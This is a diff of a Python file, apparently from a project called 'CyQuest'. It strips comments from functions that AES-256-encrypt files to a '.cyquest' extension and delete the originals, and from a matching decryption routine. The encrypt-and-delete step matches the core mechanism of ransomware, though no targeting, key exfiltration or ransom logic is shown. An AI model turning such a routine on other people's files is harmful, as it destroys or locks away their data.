@@ -4,9 +4,6 @@ from cryptography.hazmat.primitives import padding
 from cryptography.hazmat.backends import default_backend
 
 
-# ==============================
-# 🔐 CRIPTOGRAFIA
-# ==============================
 def criptografar_arquivo(caminho_arquivo, chave_aes_256):
     tamanho_chunk = 64 * 1024
     caminho_saida = caminho_arquivo + ".cyquest"
@@ -40,7 +37,7 @@ def criptografar_arquivo(caminho_arquivo, chave_aes_256):
 
         print(f"[+] Arquivo criptografado: {caminho_saida}")
 
-        # 🗑️ Apaga o original após criptografar
+        
         os.remove(caminho_arquivo)
         print(f"[!] Original apagado: {caminho_arquivo}")
 
@@ -48,15 +45,13 @@ def criptografar_arquivo(caminho_arquivo, chave_aes_256):
 
     except Exception as e:
         print(f"[-] Erro ao criptografar {caminho_arquivo}: {e}")
-        # Se algo deu errado, remove o .cyquest incompleto para não deixar lixo
+       
         if os.path.exists(caminho_saida):
             os.remove(caminho_saida)
         return None
 
 
-# ==============================
-# 🔓 DESCRIPTOGRAFIA
-# ==============================
+
 def descriptografar_arquivo(caminho_arquivo_criptografado, chave_aes_256):
     tamanho_chunk = 64 * 1024
     caminho_saida = caminho_arquivo_criptografado.replace(".cyquest", "")
@@ -91,7 +86,7 @@ def descriptografar_arquivo(caminho_arquivo_criptografado, chave_aes_256):
 
         print(f"[+] Arquivo recuperado: {caminho_saida}")
 
-        # 🗑️ Apaga o .cyquest após restaurar o original
+        
         os.remove(caminho_arquivo_criptografado)
         print(f"[!] Arquivo criptografado apagado: {caminho_arquivo_criptografado}")
 
@@ -99,7 +94,7 @@ def descriptografar_arquivo(caminho_arquivo_criptografado, chave_aes_256):
 
     except Exception as e:
         print(f"[-] Erro ao descriptografar {caminho_arquivo_criptografado}: {e}")
-        # Se algo deu errado, remove o arquivo de saída incompleto
+       
         if os.path.exists(caminho_saida):
             os.remove(caminho_saida)
         return None
